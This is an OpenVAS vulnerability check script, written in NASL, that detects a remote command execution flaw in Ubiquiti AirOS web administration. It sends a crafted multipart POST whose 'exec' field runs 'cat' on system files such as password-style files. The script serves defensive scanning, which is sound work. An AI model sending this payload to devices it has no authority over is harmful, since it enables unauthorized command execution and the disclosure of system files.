###############################################################################
# OpenVAS Vulnerability Test
#
# Ubiquiti Networks AirOS Remote Command Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103371");
  script_bugtraq_id(51178);
  script_version("2020-08-24T15:18:35+0000");
  script_name("Ubiquiti Networks AirOS Remote Command Execution Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51178");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/fulldisclosure/2011-12/0412.html");
  script_xref(name:"URL", value:"http://www.ubnt.com/");
  script_xref(name:"URL", value:"http://ubnt.com/forum/showthread.php?p=236875");

  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2011-12-22 15:05:11 +0100 (Thu, 22 Dec 2011)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "httpver.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("Host/runs_unixoide");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more details.");

  script_tag(name:"summary", value:"AirOS is prone to a vulnerability that lets attackers execute
  arbitrary commands in the context of the application. This issue
  occurs because the application fails to adequately sanitize user-
  supplied input.");

  script_tag(name:"impact", value:"Successful attacks can compromise the affected application and
  possibly the underlying device.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("host_details.inc");
include("misc_func.inc");

port = http_get_port(default:80);
traversal_files = traversal_files("linux");
check_files = make_list("/admin.cgi/sd.css","/adm.cgi/sd.css");

host = get_host_name();

foreach check_file (check_files) {

  url = string(check_file);
  req = http_get(item:url, port:port);
  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if(!buf) continue;

  if("<title>Device administration utility" >< buf) {

    foreach pattern(keys(traversal_files)) {

      traversal_file = traversal_files[pattern];

      req = string(
                    "POST ", check_file, " HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "Accept-Encoding: gzip, deflate\r\n",
                    "DNT: 1\r\n",
                    "Referer: http://", host, "/admin.cgi/sd.css\r\n",
                    "Cookie: AIROS_SESSIONID=a447a1b693b321f598389d6972ab5c18; ui_language=pt_PT\r\n",
                    "Content-Type: multipart/form-data; boundary=---------------------------15531490717347903902081461200\r\n",
                    "Content-Length: 300\r\n",
                    "\r\n",
                    "-----------------------------15531490717347903902081461200\r\n",
                    'Content-Disposition: form-data; name="exec"',"\r\n",
                    "\r\n",
                    "cat /" + traversal_file + "\r\n",
                    "-----------------------------15531490717347903902081461200\r\n",
                    'Content-Disposition: form-data; name="action"',"\r\n",
                    "\r\n",
                    "cli\r\n",
                    "-----------------------------15531490717347903902081461200--\r\n\r\n");
      result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
      if(egrep(string:result, pattern:pattern)) {
        report = http_report_vuln_url(port:port, url:check_file);
        security_message(port:port, data:report);
        exit(0);
      }
    }
  }
}

exit(99);
